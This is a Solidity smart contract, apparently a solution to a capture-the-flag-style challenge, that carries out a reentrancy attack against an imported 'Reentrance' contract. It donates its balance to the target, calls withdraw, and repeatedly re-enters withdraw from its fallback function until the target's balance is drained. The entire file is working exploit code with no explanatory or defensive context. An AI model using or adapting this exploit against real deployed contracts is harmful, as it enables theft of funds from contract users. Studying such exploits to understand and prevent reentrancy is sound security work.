// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        Reentrance target = Reentrance(contractAddress);
        target.donate{value: address(this).balance}(address(this));
        target.withdraw();
    }

    fallback() external payable {
        Reentrance target = Reentrance(contractAddress);
        if (contractAddress.balance > 0) {
            target.withdraw();
        }
    }
}
